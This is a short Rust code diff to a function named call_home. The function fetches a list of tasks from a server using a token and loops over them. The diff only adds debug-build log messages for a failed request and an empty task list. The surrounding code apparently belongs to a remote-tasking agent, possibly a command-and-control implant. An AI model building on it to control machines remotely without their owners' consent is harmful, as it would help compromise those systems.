@@ -24,8 +24,18 @@ async fn call_home(token: &String) {
 
     let tasks: Vec<Task> = match communication::get_commands(token).await {
         Ok(val) => val,
-        Err(_) => Vec::new(),
+        Err(_) => {
+            #[cfg(debug_assertions)]
+            println!("Error when asking server for tasks.");
+            Vec::new()
+        },
     };
+
+    if tasks.is_empty() {
+        #[cfg(debug_assertions)]
+        println!("No task received");
+    }
+
     for t in tasks {
         #[cfg(debug_assertions)]
         println!("\nReceived task #{}: {}", t.id, t.name);
